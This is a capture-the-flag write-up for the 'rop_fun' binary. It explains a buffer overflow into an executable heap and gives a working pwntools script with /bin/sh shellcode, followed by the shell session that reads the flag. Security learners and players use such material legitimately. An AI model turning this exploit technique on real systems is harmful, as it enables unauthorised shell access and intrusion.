### Solved by superkojiman

A little statically compiled binary called rop_fun. It waits for input, copies it into a buffer, and exits. An examination of the binary revealed that it was possible to overwrite the saved return pointer when 264 byte were sent. The input it receives gets copied into the heap, again a static location, at address 0x105ef8. I knew the server it ran on had ASLR disabled, because it was running on the same server that the other pwnables ran on. But what was really interesting, was that the heap had read/write/execute permissions!

```
gdb-peda$ vmmap
Start      End        Perm      Name
0x00100000 0x00101000 r-xp      /root/ctf/rop_fun
0x00101000 0x00102000 rwxp      /root/ctf/rop_fun
0x00102000 0x00107000 rwxp      [heap]
0xb7ffd000 0xb7fff000 r--p      [vvar]
0xb7fff000 0xb8000000 r-xp      [vdso]
0xbffdf000 0xc0000000 rwxp      [stack]
```

I'm not entirely sure why it's called ROP, when there's isn't any ROP required to solve it. I just sent shellcode to the binary so that it stored it in the executable heap, and then returned to the heap. Here's my exploit: 

```python
#!/usr/bin/env python
from pwn import *
r = remote("web.lasactf.com", 23721)

# execve "/bin/sh" shellcode
sc = "jhh///sh/bin\x89\xe31\xc9j\x0bX\x99\xcd\x80"

buf = ""
buf += sc
buf += "A"*(260-len(buf))
buf += p32(0x105ef8)

print r.recv()
r.sendline(buf)
r.interactive()
```

And here I am getting a shell and the flag: 

```
# ./sploit.py
[+] Opening connection to web.lasactf.com on port 23721: Done
Hi, enjoy ropping about!
[*] Switching to interactive mode
$ id
uid=1713(rop-phun_0) gid=1714(rop-phun_0) groups=1714(rop-phun_0)
$ ls
flag.txt
rop_fun
$ cat flag.txt
s0_much_r0p_4hhhhhh
$
```

The flag was `s0_much_r0p_4hhhhhh`
